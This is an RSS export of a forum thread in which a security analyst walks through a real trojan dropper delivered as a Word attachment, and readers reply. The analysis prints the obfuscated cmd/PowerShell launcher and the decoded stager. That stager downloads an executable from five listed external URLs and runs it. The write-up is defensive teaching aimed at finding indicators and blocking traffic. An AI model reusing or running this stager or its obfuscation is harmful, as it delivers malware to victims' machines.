<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
    <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223</link>
    <description>Hello all, Nestor10 here to share a couple things I&#39;ve learned in my day job as an infosec samurai. If you want to know some vague things about me, you can [check out my introduction](https://0x00sec.org/t/introduction-nestor10/6196).

So a few months ago, I noticed some emails coming in with really sketchy attachments - a few dozen had been delivered before I noticed, so I needed to quickly figure out what the attachments did!

### DISCLAIMER
This breakdown uses a real trojan drop script from late last year. While I&#39;m fairly sure none of the URLs in the script are still hosting any malicious code, you should proceed with the utmost caution. Do not attempt to actually run any portion of the code shown below. If you disregard this warning, you do so at your own risk, and I will not be helping you clean your system of whatever infection you end up with.

I dumped a sample in my trusty sandbox and got to work (you can use reverse.it or malwr.com to do the same). I get some interesting stuff back from dynamic analysis:

    WINWORD.EXE /n &quot;C:\Wire transfer info.doc&quot; /o &quot;u&quot; (PID: 464)

    cmd.exe &quot;cmd /v /c &quot;set %WPIWCBNzG%=RBnUjZTzm&amp;&amp;set %IPmmCqufN%=p^o^w^e^r^s&amp;&amp;set %PWKdRtDdJ%=mYnZmpJdh&amp;&amp;set %XZnNiozwI%=he^l^l&amp;&amp;set %ARXbYFCDI%=zwmAfmaLS&amp;&amp;!%IPmmCqufN%!!%XZnNiozwI%! ^-^e LgAoACgAVgBhAFIAaQBBAGIATABlACAAJwAqAG0AZAByACoAJwApAC4AbgBhAE0ARQBbADMALAAxADEALAAyAF0ALQBqAE8ASQBOACcAJwApACAAKAAiACAAJAAoAHMAZQBUAC0AaQB0AGUAbQAgACAAJw [lots of this removed for space] AAgAGYATwBSAEUAYQBDAEgAIAB7ACAAKABbAEkATgBUAF0AIAAkAF8AIAAtAGEAcwBbAEMASABhAHIAXQApAH0AKQAgACsAIgAkACgAUwBlAHQALQB2AGEAUgBpAEEAYgBMAGUAIAAnAG8AZgBTACcAIAAgACcAIAAnACkAIgApACAA (PID: 1304) 

Well that&#39;s obviously not doing anything good, but what is it doing? Further down the process tree we get something a little less obscure:

    powershell.exe powershell -e [wall of base64 removed] (PID: 912, Additional Context:  .((VaRiAbLe &#39;*mdr*&#39;).naME[3,11,2]-jOIN&#39;&#39;) (&quot; $(seT-item &#39;VARIable:OFS&#39; &#39;&#39;) &quot; +[STrING]( (36, 119,115, 99,114, 105,112 ,116 ,32 , 61 , 32 ,110 ,101 ,119 ,45,111 , 98,106,101,99,116 , 32,45, 67 , 111 ,109 , 79,98, 106,101, 99 ,116 , 32 , 87 , 83 ,99, 114 ,105 , 112,116, 46 , 83 , 104,101 ,108, 108,59 , 36,119 ,101 ,98 ,99 ,108,105, 101, 110, 116 ,32,61 , 32 , 110 ,101 , 119 ,45,111 ,98, 106,101 , 99,116, 32 , 83,121,115,116, 101, 109,46 , 78, 101,116 , 46 , 87,101,98, 67, 108 , 105 , 101 , 110 ,116 ,59 ,36 , 114 ,97 ,110, 100 ,111 ,109 , 32,61,32, 110, 101,119 , 45 , 111, 98, 106,101, 99 , 116 , 32 ,114,97 , 110 , 100,111,109,59 ,36 ,117 , 114 , 108, 115 ,32 , 61 , 32 ,39,104, 116,116,112, 58 ,47,47 , 108 ,117, 110 ,122,101, 114, 46,100, 101,47 , 76,83 ,106 , 108 , 74,81 ,100, 47, 44 , 104,116 , 116 ,112, 58 ,47 ,47,97 ,117,114, 103,101 , 108, 109 , 105 , 114,46,100,101 ,47 ,66,114, 77,103 ,47,44, 104,116,116 ,112,58,47, 47,112 ,117,105,107, 112 , 114,111 ,100, 117,107, 116 , 105 ,101 ,115, 46, 110 , 108 , 47,82 ,77 , 97, 117 ,87 ,71, 103 , 69, 47 ,44, 104, 116, 116,112,58 ,47,47, 98 ,114,111,99, 107, 101 ,45 , 108 , 111, 101 ,104, 114, 46 , 100, 101 ,47 ,109, 107,70 ,82 ,70, 72,70, 47,44 , 104 , 116 , 116,112,58 ,47,47 ,98 , 106 ,104,46, 100, 101 ,47 , 115 ,85 ,107 , 117,47,39 ,46 , 83 ,112 , 108,105 ,116 , 40 , 39, 44,39,41 , 59 ,36 ,110 , 97, 109, 101, 32,61 , 32, 36 ,114 ,97 , 110,100, 111 , 109,46,110 ,101, 120 , 116 , 40,49 , 44 ,32 ,54, 53 ,53, 51, 54,41, 59,36,112, 97 ,116 , 104 , 32 , 61 ,32, 36,101, 110, 118 , 58 ,116,101 , 109 , 112, 32 , 43,32 , 39,92 , 39,32,43 ,32, 36, 110 ,97,109,101 ,32 , 43,32 , 39 ,46,101, 120,101 ,39, 59 , 102 , 111,114 ,101,97 , 99 , 104 ,40 ,36 , 117 , 114 , 108 ,32,105 ,110, 32,36 , 117,114, 108 , 115 , 41,123 , 116,114 , 121,123 ,36 , 119, 101 , 98 , 99,108 ,105 ,101 , 110,116 , 46 ,68,111 ,119, 110 , 108, 111,97 ,100,70,105,108 , 101, 40 , 36 ,117 ,114 ,108, 46, 84,111,83 ,116,114, 105, 110 , 103 , 40, 41,44 , 32 , 36,112 , 97 ,116,104 , 41 ,59, 83 ,116 ,97,114 ,116 ,45 ,80, 114 ,111, 99,101 , 115 ,115 , 32 ,36,112 ,97,116 ,104,59 ,98, 114 , 101 , 97, 107, 59, 125 ,99, 97,116, 99 ,104,123, 119 ,114 ,105,116 , 101 , 45,104 , 111 , 115 ,116 , 32 ,36,95 ,46,69, 120, 99 ,101,112,116,105 ,111, 110 , 46 ,77, 101 ,115 , 115 ,97 ,103,101 ,59, 125,125) | fOREaCH { ([INT] $_ -as[CHar])}) +&quot;$(Set-vaRiAbLe &#39;ofS&#39; &#39; &#39;)&quot;);)
        35087.exe (PID: 1608)
            35087.exe (PID: 2368)

So it looks like we&#39;ve called Powershell and then spawned some binaries from that... but we&#39;re still no closer to understanding how to respond to this threat being on our network.

Looking at the code, we can tell that there are some strings being joined in weird ways, there&#39;s some implicit evaluation going on with parentheses, and then we&#39;ve got a whole tone of char codes, all being piped to foreach which is converting them to chars. So just like the original wall of base64 stuff that was run on cmd.exe, this should basically be creating a string to eval somehow.

Here&#39;s where things get hairy - it&#39;s not easy to figure out what string this will produce without eval()ing it ourselves. That means we have to figure out a way to remove its fangs before we proceed. Let&#39;s take a look at the first bit of code:

    .((VaRiAbLe &#39;*mdr*&#39;).naME[3,11,2]-jOIN&#39;&#39;)

Nothing too dangerous there. What happens if we run it?

    cmdlet Invoke-Expression at command pipeline position 1

Aha! We found the claws, now we can just run the rest of the script. Here&#39;s the secret it divulges to us:

    $wscript = new-object -ComObject WScript.Shell;$webclient = new-object System.Net.WebClient;$random = new-object random;$urls = &#39;http://lunzer.de/LSjlJQd/,http://aurgelmir.de/BrMg/,http://puikprodukties.nl/RMauWGgE/,http://brocke-loehr.de/mkFRFHF/,http://bjh.de/sUku/&#39;.Split(&#39;,&#39;);$name = $random.next(1, 65536);$path = $env:temp + &#39;\&#39; + $name + &#39;.exe&#39;;foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);Start-Process $path;break;}catch{write-host $_.Exception.Message;}}

When I ran the dynamic analysis, it gave me 1 IP to look into... but now that we&#39;ve pulled apart the code, it&#39;s clear that I need to be looking for any traffic to any URL in the $urls string there.

Thanks to our l33t h@x0r skilz, the affected users have been dismissed out the nearest airlock and we can block all the future traffic. Hurray!

Thanks for reading this cringe-worthy, sad excuse for a writeup. It&#39;s my first time putting something like this together for a larger audience than the suits at work, so any feedback you might have will be appreciated immensely by myself. Same goes for any questions. :slight_smile:

Until next time,
Nestor0x0000000A</description>
    
    <lastBuildDate>Fri, 13 Apr 2018 18:32:18 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/8</link>
        <pubDate>Tue, 08 May 2018 21:59:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6223-8</guid>
        <source url="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</source>
      </item>
      <item>
        <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>suser was being suser.  No worries <a class="mention" href="https://0x00sec.org/u/nestor10">@Nestor10</a> it was just flagged/hidden because it was no helpful for this thread and the potential discussions about it <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/7</link>
        <pubDate>Fri, 13 Apr 2018 18:32:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6223-7</guid>
        <source url="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</source>
      </item>
      <item>
        <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
        <dc:creator><![CDATA[Nestor10]]></dc:creator>
        <description><![CDATA[
            <p>Please don’t flag Suser - he posted this because I’d made a joke on the IRC channel. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/6</link>
        <pubDate>Fri, 13 Apr 2018 18:23:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6223-6</guid>
        <source url="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</source>
      </item>
      <item>
        <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
        <dc:creator><![CDATA[Solinus]]></dc:creator>
        <description><![CDATA[
            <p>Not a bad write up at all. Can learn something from anything if you take the time to do so. Nice post</p>
          <p><a href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/5</link>
        <pubDate>Fri, 13 Apr 2018 02:02:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6223-5</guid>
        <source url="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</source>
      </item>
      <item>
        <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
        <dc:creator><![CDATA[Nestor10]]></dc:creator>
        <description><![CDATA[
            <p>Most likely hijacked - a vast majority of the things I end up temp blocking on my network are personal sites, blogs, etc. Lots of WordPress sites.</p>
<p>The file downloaded from that site would most likely be a stage 2 dropper that would then deliver the actual malware (sometimes from an actual C2).</p>
          <p><a href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/4</link>
        <pubDate>Thu, 12 Apr 2018 22:13:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6223-4</guid>
        <source url="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</source>
      </item>
      <item>
        <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
        <dc:creator><![CDATA[fxbg]]></dc:creator>
        <description><![CDATA[
            <p>I remember when Trojans only affected Windows… oh wait, this one too, darn, thought we turned a corner!</p>
<p>Also, about the <a href="http://lunzer.de/" rel="nofollow noopener">http://lunzer.de/</a> link, I wonder if the trojan author was stupid enough to use his personal website for this or if this domain is fronted/hijacked?</p>
          <p><a href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/3</link>
        <pubDate>Mon, 09 Apr 2018 05:09:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6223-3</guid>
        <source url="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</source>
      </item>
      <item>
        <title>Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</title>
        <dc:creator><![CDATA[Nestor10]]></dc:creator>
        <description><![CDATA[
            <p>Hello all, Nestor10 here to share a couple things I’ve learned in my day job as an infosec samurai. If you want to know some vague things about me, you can <a href="https://0x00sec.org/t/introduction-nestor10/6196">check out my introduction</a>.</p>
<p>So a few months ago, I noticed some emails coming in with really sketchy attachments - a few dozen had been delivered before I noticed, so I needed to quickly figure out what the attachments did!</p>
<h3>DISCLAIMER</h3>
<p>This breakdown uses a real trojan drop script from late last year. While I’m fairly sure none of the URLs in the script are still hosting any malicious code, you should proceed with the utmost caution. Do not attempt to actually run any portion of the code shown below. If you disregard this warning, you do so at your own risk, and I will not be helping you clean your system of whatever infection you end up with.</p>
<p>I dumped a sample in my trusty sandbox and got to work (you can use reverse.it or <a href="http://malwr.com" rel="nofollow noopener">malwr.com</a> to do the same). I get some interesting stuff back from dynamic analysis:</p>
<pre><code>WINWORD.EXE /n "C:\Wire transfer info.doc" /o "u" (PID: 464)

cmd.exe "cmd /v /c "set %WPIWCBNzG%=RBnUjZTzm&amp;&amp;set %IPmmCqufN%=p^o^w^e^r^s&amp;&amp;set %PWKdRtDdJ%=mYnZmpJdh&amp;&amp;set %XZnNiozwI%=he^l^l&amp;&amp;set %ARXbYFCDI%=zwmAfmaLS&amp;&amp;!%IPmmCqufN%!!%XZnNiozwI%! ^-^e LgAoACgAVgBhAFIAaQBBAGIATABlACAAJwAqAG0AZAByACoAJwApAC4AbgBhAE0ARQBbADMALAAxADEALAAyAF0ALQBqAE8ASQBOACcAJwApACAAKAAiACAAJAAoAHMAZQBUAC0AaQB0AGUAbQAgACAAJw [lots of this removed for space] AAgAGYATwBSAEUAYQBDAEgAIAB7ACAAKABbAEkATgBUAF0AIAAkAF8AIAAtAGEAcwBbAEMASABhAHIAXQApAH0AKQAgACsAIgAkACgAUwBlAHQALQB2AGEAUgBpAEEAYgBMAGUAIAAnAG8AZgBTACcAIAAgACcAIAAnACkAIgApACAA (PID: 1304) 
</code></pre>
<p>Well that’s obviously not doing anything good, but what is it doing? Further down the process tree we get something a little less obscure:</p>
<pre><code>powershell.exe powershell -e [wall of base64 removed] (PID: 912, Additional Context:  .((VaRiAbLe '*mdr*').naME[3,11,2]-jOIN'') (" $(seT-item 'VARIable:OFS' '') " +[STrING]( (36, 119,115, 99,114, 105,112 ,116 ,32 , 61 , 32 ,110 ,101 ,119 ,45,111 , 98,106,101,99,116 , 32,45, 67 , 111 ,109 , 79,98, 106,101, 99 ,116 , 32 , 87 , 83 ,99, 114 ,105 , 112,116, 46 , 83 , 104,101 ,108, 108,59 , 36,119 ,101 ,98 ,99 ,108,105, 101, 110, 116 ,32,61 , 32 , 110 ,101 , 119 ,45,111 ,98, 106,101 , 99,116, 32 , 83,121,115,116, 101, 109,46 , 78, 101,116 , 46 , 87,101,98, 67, 108 , 105 , 101 , 110 ,116 ,59 ,36 , 114 ,97 ,110, 100 ,111 ,109 , 32,61,32, 110, 101,119 , 45 , 111, 98, 106,101, 99 , 116 , 32 ,114,97 , 110 , 100,111,109,59 ,36 ,117 , 114 , 108, 115 ,32 , 61 , 32 ,39,104, 116,116,112, 58 ,47,47 , 108 ,117, 110 ,122,101, 114, 46,100, 101,47 , 76,83 ,106 , 108 , 74,81 ,100, 47, 44 , 104,116 , 116 ,112, 58 ,47 ,47,97 ,117,114, 103,101 , 108, 109 , 105 , 114,46,100,101 ,47 ,66,114, 77,103 ,47,44, 104,116,116 ,112,58,47, 47,112 ,117,105,107, 112 , 114,111 ,100, 117,107, 116 , 105 ,101 ,115, 46, 110 , 108 , 47,82 ,77 , 97, 117 ,87 ,71, 103 , 69, 47 ,44, 104, 116, 116,112,58 ,47,47, 98 ,114,111,99, 107, 101 ,45 , 108 , 111, 101 ,104, 114, 46 , 100, 101 ,47 ,109, 107,70 ,82 ,70, 72,70, 47,44 , 104 , 116 , 116,112,58 ,47,47 ,98 , 106 ,104,46, 100, 101 ,47 , 115 ,85 ,107 , 117,47,39 ,46 , 83 ,112 , 108,105 ,116 , 40 , 39, 44,39,41 , 59 ,36 ,110 , 97, 109, 101, 32,61 , 32, 36 ,114 ,97 , 110,100, 111 , 109,46,110 ,101, 120 , 116 , 40,49 , 44 ,32 ,54, 53 ,53, 51, 54,41, 59,36,112, 97 ,116 , 104 , 32 , 61 ,32, 36,101, 110, 118 , 58 ,116,101 , 109 , 112, 32 , 43,32 , 39,92 , 39,32,43 ,32, 36, 110 ,97,109,101 ,32 , 43,32 , 39 ,46,101, 120,101 ,39, 59 , 102 , 111,114 ,101,97 , 99 , 104 ,40 ,36 , 117 , 114 , 108 ,32,105 ,110, 32,36 , 117,114, 108 , 115 , 41,123 , 116,114 , 121,123 ,36 , 119, 101 , 98 , 99,108 ,105 ,101 , 110,116 , 46 ,68,111 ,119, 110 , 108, 111,97 ,100,70,105,108 , 101, 40 , 36 ,117 ,114 ,108, 46, 84,111,83 ,116,114, 105, 110 , 103 , 40, 41,44 , 32 , 36,112 , 97 ,116,104 , 41 ,59, 83 ,116 ,97,114 ,116 ,45 ,80, 114 ,111, 99,101 , 115 ,115 , 32 ,36,112 ,97,116 ,104,59 ,98, 114 , 101 , 97, 107, 59, 125 ,99, 97,116, 99 ,104,123, 119 ,114 ,105,116 , 101 , 45,104 , 111 , 115 ,116 , 32 ,36,95 ,46,69, 120, 99 ,101,112,116,105 ,111, 110 , 46 ,77, 101 ,115 , 115 ,97 ,103,101 ,59, 125,125) | fOREaCH { ([INT] $_ -as[CHar])}) +"$(Set-vaRiAbLe 'ofS' ' ')");)
    35087.exe (PID: 1608)
        35087.exe (PID: 2368)
</code></pre>
<p>So it looks like we’ve called Powershell and then spawned some binaries from that… but we’re still no closer to understanding how to respond to this threat being on our network.</p>
<p>Looking at the code, we can tell that there are some strings being joined in weird ways, there’s some implicit evaluation going on with parentheses, and then we’ve got a whole tone of char codes, all being piped to foreach which is converting them to chars. So just like the original wall of base64 stuff that was run on cmd.exe, this should basically be creating a string to eval somehow.</p>
<p>Here’s where things get hairy - it’s not easy to figure out what string this will produce without eval()ing it ourselves. That means we have to figure out a way to remove its fangs before we proceed. Let’s take a look at the first bit of code:</p>
<pre><code>.((VaRiAbLe '*mdr*').naME[3,11,2]-jOIN'')
</code></pre>
<p>Nothing too dangerous there. What happens if we run it?</p>
<pre><code>cmdlet Invoke-Expression at command pipeline position 1
</code></pre>
<p>Aha! We found the claws, now we can just run the rest of the script. Here’s the secret it divulges to us:</p>
<pre><code>$wscript = new-object -ComObject WScript.Shell;$webclient = new-object System.Net.WebClient;$random = new-object random;$urls = 'http://lunzer.de/LSjlJQd/,http://aurgelmir.de/BrMg/,http://puikprodukties.nl/RMauWGgE/,http://brocke-loehr.de/mkFRFHF/,http://bjh.de/sUku/'.Split(',');$name = $random.next(1, 65536);$path = $env:temp + '\' + $name + '.exe';foreach($url in $urls){try{$webclient.DownloadFile($url.ToString(), $path);Start-Process $path;break;}catch{write-host $_.Exception.Message;}}
</code></pre>
<p>When I ran the dynamic analysis, it gave me 1 IP to look into… but now that we’ve pulled apart the code, it’s clear that I need to be looking for any traffic to any URL in the $urls string there.</p>
<p>Thanks to our l33t h@x0r skilz, the affected users have been dismissed out the nearest airlock and we can block all the future traffic. Hurray!</p>
<p>Thanks for reading this cringe-worthy, sad excuse for a writeup. It’s my first time putting something like this together for a larger audience than the suits at work, so any feedback you might have will be appreciated immensely by myself. Same goes for any questions. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Until next time,<br>
Nestor0x0000000A</p>
          <p><a href="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223/1</link>
        <pubDate>Sun, 08 Apr 2018 21:59:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-6223-1</guid>
        <source url="https://0x00sec.org/t/nestor10s-malware-analysis-101-anatomy-of-a-trojan-part-1/6223.rss">Nestor10&#39;s Malware Analysis 101 - Anatomy of a Trojan Part 1/?</source>
      </item>
  </channel>
</rss>
